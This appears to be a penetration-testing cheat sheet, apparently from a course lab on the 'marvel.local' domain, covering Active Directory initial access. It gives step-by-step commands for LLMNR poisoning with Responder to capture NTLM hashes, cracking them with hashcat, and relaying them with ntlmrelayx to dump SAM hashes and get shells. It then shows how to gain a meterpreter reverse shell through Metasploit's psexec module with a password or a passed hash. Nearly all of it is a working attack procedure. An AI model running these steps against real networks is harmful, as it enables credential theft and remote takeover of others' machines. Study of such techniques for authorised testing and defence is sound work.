# Initial Access
## LLMNR Poisoning
### Capturing Responses
1. Verify you are on the right network
2. ```sudo responder -I eth0 -dwPv```
3. Navigate from the explorer window to \\(IP Address)
4. This will show you the hash as well as the NTLM version

### Crack the hash you retrieved
1. ```nano hashes.txt``
2. Copy and paste the entire line (from username to the end)
3. ```hashcat --help | grep NTLM``` will show you what number to use
4. ```hashcat -m 5600 hashes.txt (wordlist) -r OneRule```

## SMB Relay
If you get a hash from responder, you can relay the hash to other shares without having to crack the hash.
- Requires smb signing must be disabled or not enforced on target
- Not enabled on workstations but enforced on servers
- You cant relay a hash back to yourself. You have to have it on a different machine

1. Identify host without SMB signing -- ```nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24```
2. Update responder -- ```sudo mousepad /etc/responder/Responder.conf```
   - Turn off SMB and HTTP
3. Run Responder -- ```sudo responder -I eth0 -dwP```
4. Setup your relay -- ```sudo ntlmrelayx.py -tf targets.txt -smb2support```
5. Need an event to occur
6. This will then dump out the hashes of the SAM
7. Alternative for interactive shell -- ```sudo ntlmrelayx.py -tf targets.txt -smbsupport -i```
8. ```nc 127.0.0.1 11000```
9. Alternative -- sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"

## Gaining a shell
### Shell with domain
1. start metasploit
2. use module psexec - exploit/windows/smb/psexec
3. Verify payload for 64 bit-- use windows/x64/meterpreter/reverse_tcp
4. Set RHOST
5. set smbdomain -- ```set smbdomain marvel.local```
6. set smbuser
7. set smbpass
8. exploit
### Shell with hash
1. start metasploit
2. use module psexec - exploit/windows/smb/psexec
3. Verify payload for 64 bit-- use windows/x64/meterpreter/reverse_tcp
4. Set RHOST
5. unset domain
6. Copy all of this <img width="847" height="82" alt="image" src="https://github.com/user-attachments/assets/8346761e-b29e-483d-8772-cf26ab9806ef" />
7. set smb pass and paste what you copied
8. exploit


